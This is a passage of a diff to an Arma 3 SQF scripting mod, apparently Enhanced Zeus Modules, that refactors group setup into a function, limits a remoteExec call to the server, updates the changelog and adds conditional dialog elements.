-				_groups = ["GetAllGroupsOfSide",[_side]] call BIS_fnc_dynamicGroups;
-				EZM_curator_group = createGroup _side;
-				EZM_curator_group deleteGroupWhenEmpty true;
-				[player] join EZM_curator_group;
-				EZM_curator_group selectLeader player;
-				[EZM_curator_group, player] remoteExec ["selectLeader", groupOwner EZM_curator_group];					
-				EZM_curator_group setGroupIdGlobal [_groupName];
-				private _group = EZM_curator_group;
-				private _leader = leader _group;
-				private _data = [nil, _groupName, false]; comment " [<Insignia>, <Group Name>, <Private>] ";
-				["RegisterGroup", [_group, _leader, _data]] remoteExecCall ['BIS_fnc_dynamicGroups'];
-				["AddGroupMember", [EZM_curator_group,player]] remoteExecCall ['BIS_fnc_dynamicGroups'];
-				["SwitchLeader", [EZM_curator_group,player]] remoteExecCall ['BIS_fnc_dynamicGroups'];
-				["SetPrivateState", [EZM_curator_group,true]] remoteExecCall ['BIS_fnc_dynamicGroups'];	
-				["SetName", [EZM_curator_group,_groupName]] remoteExecCall ['BIS_fnc_dynamicGroups'];
+				[sideLogic] call MAZ_EZM_fnc_switchGroupSetup;
 			}];
 			_btn_zeus ctrlCommit 0;
 		};
@@ -17761,7 +18395,7 @@ MAZ_EZM_fnc_initMainLoop = {
 	while {MAZ_EZM_mainLoop_Active} do {
 		waitUntil {uiSleep 0.01; (!isNull (findDisplay 312))};
 		if(!isNil "MAZ_EP_ServerDLCs" && !isNil "MAZ_CDLC_EP_fnc_newZeus" && isNil "MAZ_CDLC_Setup") then {
-			[getAssignedCuratorLogic player] remoteExec ["unassignCurator"];
+			[getAssignedCuratorLogic player] remoteExec ["unassignCurator",2];
 			waitUntil {isNull (getAssignedCuratorLogic player)};
 			[[player],{
 				params ["_unit"];
@@ -17825,13 +18459,21 @@ if(isNil "MAZ_EZM_shamelesslyPlugged") then {
 };
 
 private _changelog = [
-	"Changed loading of new Modules and Factions to auto refresh after 10 seconds instead of instantly",
-	"Changed AIO Arsenal functions to be modular",
-	"Changed Airdrop module arsenal to not show markers",
-	"Fixed background colors for Expand and Collapse buttons",
-	"Fixed various undefined variable script errors",
-	"Fixed system that opens the respawn modules when no respawn is available was using slow method",
-	"Fixed Cleaner system would not delete bodies"
+	"Added Server Protection System. Detects unauthorized Zeus access, players joining with different names, and a known troll banlist.",
+	"Added first iteration of Cinematics modules - Thanks Bijx",
+	"Added COLOR dialog element",
+	"Added Change Unit/Group Side context actions",
+	"Changed context menu to have a darker background for better readability",
+	"Changed the Dialog system to have conditions and onChanged events",
+	"Changed the Dialog system to have increased performance, speeding up loading",
+	"Changed Airdrop and Create Zeus Unit dialogs to use conditional elements",
+	"Changed tooltips background color to be readable",
+	"Changed various module tooltips to be more descriptive",
+	"Changed the Edit Vehicle Appearance elements to be more readable",
+	"Changed Pylon Editor to use a GUI instead of 3D controls",
+	"Fixed issues where dynamic modules would be removed if the player ran EZM again",
+	"Fixed issue where the Blackwasp Appearance was not editable",
+	"Fixed issue where wings were only folding the left wing"
 ];
 
 private _changelogString = "";
@@ -17848,12 +18490,21 @@ private _changelogString = "";
 	[
 		"TOOLBOX:YESNO",
 		["Join a Side Channel?","Whether you will be set as a certain side and be able to hear their side chat."],
-		[true]
+		[true],
+		{true},
+		{
+			params ["_display","_value"];
+			_display setVariable ["MAZ_EZM_showSides",_value];
+		}
 	],
 	[
 		"SIDES",
 		"Side to Join",
-		west
+		west,
+		{
+			params ["_display"];
+			_display getVariable ["MAZ_EZM_showSides",true];
+		}
 	],
 	[
 		"EDIT:MULTI",
@@ -17881,7 +18532,10 @@ private _changelogString = "";
 },{
 	params ["_values","_args","_display"];
 	_display closeDisplay 2;
-},[]] call MAZ_EZM_fnc_createDialog;
+},[],{
+	params ["_display"];
+	_display setVariable ["MAZ_EZM_showSides",true];
+}] call MAZ_EZM_fnc_createDialog;
 
 comment "
 	TODO Expung3d:
